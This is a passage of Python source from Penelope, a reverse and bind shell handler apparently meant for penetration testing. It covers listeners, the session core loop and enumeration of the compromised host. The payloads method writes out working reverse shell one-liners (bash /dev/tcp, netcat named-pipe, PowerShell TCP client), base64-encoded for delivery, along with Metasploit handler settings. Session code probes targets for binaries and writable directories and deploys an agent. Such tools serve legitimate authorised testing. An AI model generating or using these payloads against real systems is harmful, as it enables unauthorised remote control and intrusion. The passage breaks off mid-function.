		[add[-i<iface>][-p<port>]|stop<id>]
		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
			listeners stop 1		Stop the Listener with ID 1
		"""
		if line:
			parser = ArgumentParser(prog="listeners")
			subparsers = parser.add_subparsers(dest="command", required=True)

			parser_add = subparsers.add_parser("add", help="Add a new listener")
			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
			parser_add.add_argument("-p", "--ports", help="Ports to listen on (comma separated)", default=[options.default_listener_port])
			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')

			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
			parser_stop.add_argument("id", help="Listener ID to stop")

			try:
				args = parser.parse_args(line.split())
			except SystemExit:
				return False

			if args.command == "add":
				options.ports = args.ports
				if args.type == 'tcp':
					for port in options.ports:
						TCPListener(args.interface, port)

			elif args.command == "stop":
				if args.id == '*':
					listeners = core.listeners.copy()
					if listeners:
						for listener in listeners.values():
							listener.stop()
					else:
						cmdlogger.warning("No listeners to stop...")
						return False
				else:
					try:
						core.listeners[int(args.id)].stop()
					except (KeyError, ValueError):
						logger.error("Invalid Listener ID")

		else:
			if core.listeners:
				table = Table(joinchar=' | ')
				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
				for listener in core.listeners.values():
					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				cmdlogger.warning("No active Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		if not line:
			cmdlogger.warning("No target specified")
			return False
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_payloads(self, line):
		"""
		[interface_name]
		Create reverse shell payloads based on the active listeners
		"""
		if core.listeners:
			print()
			for listener in core.listeners.values():
				print(listener.payloads(line))
		else:
			cmdlogger.warning("No Listeners to show payloads")

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_exit(self, line):
		"""

		Exit Penelope
		"""
		if ask(f"Exit Penelope?{self.active_sessions} (y/N): ").lower() == 'y':
			super().do_exit(line)
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			cmdlogger.info("Exited!")
			remaining_threads = [thread for thread in threading.enumerate()]
			if options.dev_mode and remaining_threads:
				cmdlogger.error(f"REMAINING THREADS: {remaining_threads}")
			return True
		return False

	def do_EOF(self, line):
		if self.sid:
			self.set_id(None)
			print()
		else:
			print("exit")
			return self.do_exit(line)

	def do_modules(self, line):
		"""

		Show available modules
		"""
		self.show_modules()

	def do_reload(self, line):
		"""

		Reload the rc file
		"""
		load_rc()

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					new_value = eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		else:
			parts = line.split(" ", 1)
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(f"No such command: '{line}'. Issue 'help' for all available commands")
			elif len(candidates) == 1:
				cmd = candidates[0]
				if len(parts) == 2:
					cmd += " " + parts[1]
				stdout(f"\x1b[1A\x1b[2K{self.prompt}{cmd}\n".encode(), False)
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		last = -2 if text else -1
		arg = line.split()[last]

		if arg == 'listeners':
			return [command for command in ["add", "stop"] if command.startswith(text)]
		elif arg in ('-i', '--interface'):
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		elif arg in ('-t', '--type'):
			return [_type for _type in ("tcp",) if _type.startswith(text)]
		elif arg == 'stop':
			return self.get_core_id_completion(text, "*", attr='listeners')

	def complete_payloads(self, text, line, begidx, endidx):
		return [iface for iface in Interfaces().list if iface.startswith(text)]

	def complete_upload(self, text, line, begidx, endidx):
		return __class__.file_completer(text)

	def complete_use(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]

	def complete_help(self, text, line, begidx, endidx):
		return [command for command in self.raw_commands if command.startswith(text)]


class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		self.queue.put(command)
		os.write(self._in, b'\x00')

	def get(self):
		os.read(self._out, 1)
		return self.queue.get()

	def clear(self):
		amount = 0
		while not self.queue.empty():
			try:
				self.queue.get_nowait()
				amount += 1
			except queue.Empty:
				break
		os.read(self._out, amount) # maybe needs 'try' because sometimes close() precedes

	def close(self):
		os.close(self._in)
		os.close(self._out)

class Core:

	def __init__(self):
		self.started = False

		self.control = ControlQueue()
		self.rlist = [self.control]
		self.wlist = []

		self.attached_session = None
		self.session_wait_host = None
		self.session_wait = queue.LifoQueue()

		self.lock = threading.Lock() # TO REMOVE
		self.conn_semaphore = threading.Semaphore(5)

		self.listenerID = 0
		self.listener_lock = threading.Lock()
		self.sessionID = 0
		self.session_lock = threading.Lock()
		self.fileserverID = 0
		self.fileserver_lock = threading.Lock()

		self.hosts = defaultdict(list)
		self.sessions = {}
		self.listeners = {}
		self.fileservers = {}
		self.forwardings = {}

		self.output_line_buffer = LineBuffer(1)
		self.wait_input = False

	def __getattr__(self, name):

		if name == 'new_listenerID':
			with self.listener_lock:
				self.listenerID += 1
				return self.listenerID

		elif name == 'new_sessionID':
			with self.session_lock:
				self.sessionID += 1
				return self.sessionID

		elif name == 'new_fileserverID':
			with self.fileserver_lock:
				self.fileserverID += 1
				return self.fileserverID
		else:
			raise AttributeError(name)

	@property
	def threads(self):
		return [thread.name for thread in threading.enumerate()]

	def start(self):
		self.started = True
		threading.Thread(target=self.loop, name="Core").start()

	def loop(self):

		while self.started:
			readables, writables, _ = select(self.rlist, self.wlist, [])

			for readable in readables:

				# The control queue
				if readable is self.control:
					command = self.control.get()
					if command:
						logger.debug(f"About to execute {command}")
					else:
						logger.debug("Core break")
					try:
						exec(command)
					except KeyError: # TODO
						logger.debug("The session does not exist anymore")
					break

				# The listeners
				elif readable.__class__ is TCPListener:
					_socket, endpoint = readable.socket.accept()
					thread_name = f"NewCon{endpoint}"
					logger.debug(f"New thread: {thread_name}")
					threading.Thread(target=Session, args=(_socket, *endpoint, readable), name=thread_name).start()

				# STDIN
				elif readable is sys.stdin:
					if self.attached_session:
						session = self.attached_session
						if session.type == 'Readline':
							continue

						data = os.read(sys.stdin.fileno(), options.network_buffer_size)

						if session.subtype == 'cmd':
							self._cmd = data

						if data == options.escape['sequence']:
							if session.alternate_buffer:
								logger.error("(!) Exit the current alternate buffer program first")
							else:
								session.detach()
						else:
							if session.type == 'Raw':
								session.record(data, _input=not session.interactive)

							elif session.agent:
								data = Messenger.message(Messenger.SHELL, data)

							session.send(data, stdin=True)
					else:
						logger.error("You shouldn't see this error; Please report it")

				# The sessions
				elif readable.__class__ is Session:
					try:
						data = readable.socket.recv(options.network_buffer_size)
						if not data:
							raise OSError

					except OSError:
						logger.debug("Died while reading")
						readable.kill()
						break

					# TODO need thread sync
					target = readable.shell_response_buf\
					if not readable.subchannel.active\
					and readable.subchannel.allow_receive_shell_data\
					else readable.subchannel

					if readable.agent:
						for _type, _value in readable.messenger.feed(data):
							#print(_type, _value)
							if _type == Messenger.SHELL:
								if not _value: # TEMP
									readable.kill()
									break
								target.write(_value)

							elif _type == Messenger.STREAM:
								stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
								#print((repr(stream_id), repr(data)))
								try:
									readable.streams[stream_id] << data
								except (OSError, KeyError):
									logger.debug(f"Cannot write to stream; Stream <{stream_id}> died prematurely")
					else:
						target.write(data)

					shell_output = readable.shell_response_buf.getvalue() # TODO
					if shell_output:
						if readable.is_attached:
							stdout(shell_output)

						readable.record(shell_output)

						if b'\x1b[?1049h' in data:
							readable.alternate_buffer = True

						if b'\x1b[?1049l' in data:
							readable.alternate_buffer = False
						#if readable.subtype == 'cmd' and self._cmd == data:
						#	data, self._cmd = b'', b'' # TODO

						readable.shell_response_buf.seek(0)
						readable.shell_response_buf.truncate(0)

			for writable in writables:
				with writable.wlock:
					try:
						sent = writable.socket.send(writable.outbuf.getvalue())
					except OSError:
						logger.debug("Died while writing")
						writable.kill()
						break

					writable.outbuf.seek(sent)
					remaining = writable.outbuf.read()
					writable.outbuf.seek(0)
					writable.outbuf.truncate()
					writable.outbuf.write(remaining)
					if not remaining:
						self.wlist.remove(writable)

	def stop(self):
		options.maintain = 0

		if self.sessions:
			logger.warning("Killing sessions...")
			for session in reversed(list(self.sessions.copy().values())):
				session.kill()

		for listener in self.listeners.copy().values():
			listener.stop()

		for fileserver in self.fileservers.copy().values():
			fileserver.stop()

		self.control << 'self.started = False'

		menu.stop = True
		menu.cmdqueue.append("")
		menu.active.set()

def handle_bind_errors(func):
	@wraps(func)
	def wrapper(*args, **kwargs):
		host = args[1]
		port = args[2]
		try:
			func(*args, **kwargs)
			return True

		except PermissionError:
			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
			print(dedent(
			f"""
			{paint('Workarounds:')}

			1) {paint('Port forwarding').UNDERLINE} (Run the Listener on a non-privileged port e.g 4444)
			    sudo iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft add rule ip nat prerouting tcp dport {port} redirect to 4444
			        {paint('then').white}
			    sudo iptables -t nat -D PREROUTING -p tcp --dport {port} -j REDIRECT --to-port 4444
			        {paint('or').white}
			    sudo nft delete rule ip nat prerouting tcp dport {port} redirect to 4444

			2) {paint('Setting CAP_NET_BIND_SERVICE capability').UNDERLINE}
			    sudo setcap 'cap_net_bind_service=+ep' {os.path.realpath(sys.executable)}
			    ./penelope.py {port}
			    sudo setcap 'cap_net_bind_service=-ep' {os.path.realpath(sys.executable)}

			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelope)
			    sudo ./penelope.py {port}
			"""))

		except socket.gaierror:
			logger.error("Cannot resolve hostname")

		except OSError as e:
			if e.errno == EADDRINUSE:
				logger.error(f"The port '{port}' is currently in use")
			elif e.errno == EADDRNOTAVAIL:
				logger.error(f"Cannot listen on '{host}'")
			else:
				logger.error(f"OSError: {str(e)}")

		except OverflowError:
			logger.error("Invalid port number. Valid numbers: 1-65535")

		except ValueError:
			logger.error("Port number must be numeric")

		return False
	return wrapper

def Connect(host, port):

	try:
		port = int(port)
		_socket = socket.socket()
		_socket.settimeout(5)
		_socket.connect((host, port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")

	except ValueError:
		logger.error("Port number must be numeric")

	else:
		if not core.started:
			core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} {EMOJIS['target']}")
		session = Session(_socket, host, port)
		if session:
			return True

	return False

class TCPListener:

	def __init__(self, host=None, port=None):
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.port = port or options.default_listener_port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		if self.bind(self.host, self.port):
			self.start()

	def __str__(self):
		return f"TCPListener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	@handle_bind_errors
	def bind(self, host, port):
		self.port = int(port)
		self.socket.bind((host, self.port))

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		specific = ""
		if self.host == '0.0.0.0':
			specific = paint('→  ').cyan + str(paint(' • ').cyan).join([str(paint(ip).cyan) for ip in Interfaces().list.values()])

		logger.info(f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << "" # TODO

		if options.payloads:
			print(self.payloads())

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.listeners[{self.id}].stop()'
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	def payloads(self, interface_filter=None):
		interfaces = Interfaces().list
		presets = [
			"(bash >& /dev/tcp/{}/{} 0>&1) &",
			"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {} {} >/tmp/_) >/dev/null 2>&1 &",
			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
		]

		output = [str(paint(self).white_MAGENTA)]
		output.append("")
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in interfaces.values()]

		interface_count = 0
		for ip in ips:
			iface_name = {v: k for k, v in interfaces.items()}.get(ip)
			if interface_filter and iface_name != interface_filter:
				continue
			interface_count += 1
			output.extend((f'➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}', ''))
			output.append(str(paint("Bash TCP").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
			output.append("")
			output.append(str(paint("Netcat + named pipe").UNDERLINE))
			output.append(f"printf {base64.b64encode(presets[1].format(ip, self.port).encode()).decode()}|base64 -d|sh")
			output.append("")
			output.append(str(paint("Powershell").UNDERLINE))
			output.append("cmd /c powershell -e " + base64.b64encode(presets[2].format(ip, self.port).encode("utf-16le")).decode())

			output.extend(dedent(f"""
			{paint('Metasploit').UNDERLINE}
			set PAYLOAD generic/shell_reverse_tcp
			set LHOST {ip}
			set LPORT {self.port}
			set DisablePayloadHandler true
			""").split("\n"))

		output.append("─" * 80)
		if not interface_count:
			return ""
		return '\n'.join(output) + "\n"


class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = True
		self.allow_receive_shell_data = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, options.network_buffer_size)

	def write(self, data):
		os.write(self._write, data)

	def close(self):
		os.close(self._read)
		os.close(self._write)

class Session:

	def __init__(self, _socket, target, port, listener=None):
		with core.conn_semaphore:
			#print(core.threads)
			print("\a", flush=True, end='')

			self.socket = _socket
			self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			self.socket.setblocking(False)
			self.target, self.port = target, port
			try:
				self.ip = _socket.getpeername()[0]
			except:
				logger.error(f"Invalid connection from {self.target} {EMOJIS['invalid_shell']}")
				return
			self._host, self._port = self.socket.getsockname()
			self.listener = listener
			self.source = 'reverse' if listener else 'bind'

			self.id = None
			self.OS = None
			self.type = 'Raw'
			self.subtype = None
			self.interactive = None
			self.echoing = None
			self.pty_ready = None

			self.win_version = None

			self.prompt = None
			self.new = True

			self.last_lines = LineBuffer(options.attach_lines)
			self.lock = threading.Lock()
			self.wlock = threading.Lock()

			self.outbuf = io.BytesIO()
			self.shell_response_buf = io.BytesIO()

			self.tasks = {"portfwd":[], "scripts":[]}
			self.subchannel = Channel()
			self.latency = None

			self.alternate_buffer = False
			self.agent = False
			self.messenger = Messenger(io.BytesIO)

			self.streamID = 0
			self.streams = dict()
			self.stream_lock = threading.Lock()
			self.stream_code = Messenger.STREAM_CODE
			self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

			self.shell_pid = None
			self.user = None
			self.tty = None

			self._bin = defaultdict(lambda: "")
			self._tmp = None
			self._cwd = None
			self._can_deploy_agent = None

			self.upgrade_attempted = False

			core.rlist.append(self)

			if self.determine():
				logger.debug(f"OS: {self.OS}")
				logger.debug(f"Type: {self.type}")
				logger.debug(f"Subtype: {self.subtype}")
				logger.debug(f"Interactive: {self.interactive}")
				logger.debug(f"Echoing: {self.echoing}")

				self.get_system_info()

				if not self.hostname:
					if target == self.ip:
						try:
							self.hostname = socket.gethostbyaddr(target)[0]

						except socket.herror:
							self.hostname = ''
							logger.debug("Cannot resolve hostname")
					else:
						self.hostname = target

				hostname = self.hostname
				c1 = '~' if hostname else ''
				ip = self.ip
				c2 = '-'
				system = self.system
				if not system:
					system = self.OS.upper()
				if self.arch:
					system += '-' + self.arch

				self.name = f"{hostname}{c1}{ip}{c2}{system}"
				self.name_colored = (
					f"{paint(hostname).white_BLUE}{paint(c1).white_DIM}"
					f"{paint(ip).white_RED}{paint(c2).white_DIM}"
					f"{paint(system).cyan}"
				)

				self.id = core.new_sessionID
				core.hosts[self.name].append(self)
				core.sessions[self.id] = self

				if self.name == core.session_wait_host:
					core.session_wait.put(self.id)

				logger.info(
					f"Got {self.source} shell from "
					f"{self.name_colored}{paint().green} {EMOJIS['new_shell']} "
					f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
				)

				self.directory = options.basedir / "sessions" / self.name
				if not options.no_log:
					self.directory.mkdir(parents=True, exist_ok=True)
					self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}.log'
					self.histfile = self.directory / "readline_history"
					self.logfile = open(self.logpath, 'ab', buffering=0)
					if not options.no_timestamps:
						self.logfile.write(str(paint(datetime.now().strftime("%Y-%m-%d %H:%M:%S: ")).magenta).encode())

				for module in modules().values():
					if module.enabled and module.on_session_start:
						module.run(self, None)

				maintain_success = self.maintain()

				if options.single_session and self.listener:
					self.listener.stop()

				if hasattr(listener_menu, 'active') and listener_menu.active:
					os.close(listener_menu.control_w)
					listener_menu.finishing.wait()

				attach_conditions = [
					# Is a reverse shell and the Menu is not active and (reached the maintain value or maintain failed)
					self.listener and not menu.active.is_set() and (len(core.hosts[self.name]) == options.maintain or not maintain_success),

					# Is a bind shell and is not spawned from the Menu
					not self.listener and not menu.active.is_set(),

					# Is a bind shell and is spawned from the connect Menu command
					not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect')
				]

				# If no other session is attached
				if core.attached_session is None:
					# If auto-attach is enabled
					if not options.no_attach:
						if any(attach_conditions):
							# Attach the newly created session
							self.attach()
					else:
						if self.id == 1:
							menu.set_id(self.id)
						if not menu.active.is_set():
							menu.show()
			else:
				self.kill()
				time.sleep(1)
			return

	def __bool__(self):
		return self.socket.fileno() != -1 # and self.OS)

	def __repr__(self):
		try:
			return (
				f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
				f"interactive={self.interactive}, echoing={self.echoing})"
			)
		except:
			return f"ID: (for deletion: {self.id})"

	def __getattr__(self, name):
		if name == 'new_streamID':
			with self.stream_lock:
				if len(self.streams) == self.streams_max:
					logger.error("Too many open streams...")
					return None

				self.streamID += 1
				self.streamID = self.streamID % self.streams_max
				while struct.pack(self.stream_code, self.streamID) in self.streams:
					self.streamID += 1
					self.streamID = self.streamID % self.streams_max

				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)

				return self.streams[_stream_ID_hex]
		else:
			raise AttributeError(name)

	def fileno(self):
		return self.socket.fileno()

	@property
	def can_deploy_agent(self):
		if self._can_deploy_agent is None:
			if Path(self.directory / ".noagent").exists():
				self._can_deploy_agent = False
			else:
				_bin = self.bin['python3'] or self.bin['python']
				if _bin:
					version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
					try:
						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
					except:
						self._can_deploy_agent = False
						return self._can_deploy_agent
					self.remote_python_version = (int(major), int(minor), int(micro))
					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
						self._can_deploy_agent = True
					else:
						self._can_deploy_agent = False
				else:
					self._can_deploy_agent = False

		return self._can_deploy_agent

	@property
	def spare_control_sessions(self):
		return [session for session in self.host_control_sessions if session is not self]

	@property
	def host_needs_control_session(self):
		return [session for session in core.hosts[self.name] if session.need_control_session]

	@property
	def need_control_session(self):
		return all([self.OS == 'Unix', self.type == 'PTY', not self.agent, not self.new])

	@property
	def host_control_sessions(self):
		return [session for session in core.hosts[self.name] if not session.need_control_session]

	@property
	def control_session(self):
		if self.need_control_session:
			for session in core.hosts[self.name]:
				if not session.need_control_session:
					return session
			return None # TODO self.spawn()
		return self

	def get_system_info(self):
		self.hostname = self.system = self.arch = ''

		if self.OS == 'Unix':
			if not self.bin['uname']:
				return False

			response = self.exec(
				r'printf "$({0} -n)\t'
				r'$({0} -s)\t'
				r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
				agent_typing=True,
				value=True
			)

			try:
				self.hostname, self.system, self.arch = response.split("\t")
			except:
				return False

		elif self.OS == 'Windows':
			self.systeminfo = self.exec('systeminfo', value=True)
			if not self.systeminfo:
				return False

			if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
				self.exec("cd", force_cmd=True, raw=True)
				return False

			def extract_value(pattern):
				match = re.search(pattern, self.systeminfo, re.MULTILINE)
				return match.group(1).replace(" ", "_").rstrip() if match else ''

			self.hostname = extract_value(r"^Host Name:\s+(.+)")
			self.system = extract_value(r"^OS Name:\s+(.+)")
			self.arch = extract_value(r"^System Type:\s+(.+)")

		return True

	def get_shell_info(self, silent=False):
		self.shell_pid = self.get_shell_pid()
		self.user = self.get_user()
		if self.OS == 'Unix':
			self.tty = self.get_tty(silent=silent)

	def get_shell_pid(self):
		if self.OS == 'Unix':
			response = self.exec("echo $$", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			return None # TODO

		if not (isinstance(response, str) and response.isnumeric()):
			logger.error(f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	def get_user(self):
		if self.OS == 'Unix':
			response = self.exec("echo \"$(id -un)($(id -u))\"", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			response = self.exec("whoami", force_cmd=True, value=True)

		return response or ''

	def get_tty(self, silent=False):
		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
		if not (isinstance(response, str) and response.startswith('/')):
			if not silent:
				logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	@property
	def cwd(self):
		if self._cwd is None:
			if self.OS == 'Unix':
				cmd = (
				    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
				    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $9;exit}}' | grep . || "
				    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
				    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
				)
				self._cwd = self.exec(cmd, value=True)
			elif self.OS == 'Windows':
				self._cwd = self.exec("cd", force_cmd=True, value=True)
		return self._cwd or ''

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def bin(self):
		if not self._bin:
			try:
				if self.OS == "Unix":
					binaries = [
						"sh", "bash", "python", "python3", "uname",
						"script", "socat", "tty", "echo", "base64", "wget",
						"curl", "tar", "rm", "stty", "setsid", "find", "nc"
					]
					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
					if response:
						self._bin = dict(zip(binaries, response.decode().splitlines()))

					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]

					if missing:
						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
						response = self.exec(
							f'for bin in {" ".join(missing)}; do for dir in '
							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
						)
						if response:
							self._bin.update(dict(zip(missing, response.decode().splitlines())))

				for binary in options.no_bins:
					self._bin[binary] = None

				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
				logger.debug(f"Available binaries on target: \n{paint(result).red}")
			except:
				pass

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug("Trying to find a writable directory on target")
				tmpname = rand(10)
				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
				for directory in common_dirs:
					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
						self.exec(f'rm {directory}/{tmpname}')
						self._tmp = directory
						break
				else:
					candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
					if candidate_dirs:
						for directory in candidate_dirs.decode().splitlines():
							if directory in common_dirs:
								continue
							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
								self.exec(f'rm {directory}/{tmpname}')
								self._tmp = directory
								break
				if not self._tmp:
					self._tmp = False
					logger.warning("Cannot find writable directory on target...")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)

		return self._tmp

	def agent_only(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if not self.agent:
				if not self.upgrade_attempted and self.can_deploy_agent:
					logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
					self.upgrade()
					if not self.agent:
						logger.error("Failed to deploy agent")
						return False
				else:
					logger.error("This can only run in python agent mode")
					return False
			return func(self, *args, **kwargs)
		return newfunc

	def send(self, data, stdin=False):
		with self.wlock: #TODO
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			_len = self.outbuf.write(data)

			self.subchannel.allow_receive_shell_data = True

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << ""
			return _len

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S: ") #TEMP
			if not options.no_colored_timestamps:
				timestamp = paint(timestamp).magenta
			data = re.sub(rb'\r\n|\r|\n|\v|\f', rf"\g<0>{timestamp}".encode(), data)
		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>').GREEN + ' ', encoding='utf8'))
			self.logfile.write(data)

		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self, path=False):

		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))

		def expect(data):
			data = data.decode(errors="replace")

			if var_value1 + var_value2 in data:
				return True

			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
				return re.search('batch file.\r\n', data, re.DOTALL)
			elif re.search('PS.*>', data, re.DOTALL):
				return True

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
				return re.search('or operable.*>', data, re.DOTALL)
			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
				return True

		response = self.exec(
			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
			raw=True,
			expect_func=expect
		)

		if response:
			response = response.decode(errors="replace")

			if var_value1 + var_value2 in response:
				self.OS = 'Unix'
				self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
				if self.prompt:
					self.prompt = self.prompt.group(1).encode()
				self.interactive = bool(self.prompt)
				self.echoing = f"echo ${var_name1}${var_name2}" in response

			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
					re.search('Microsoft Windows.*>', response, re.DOTALL):
				self.OS = 'Windows'
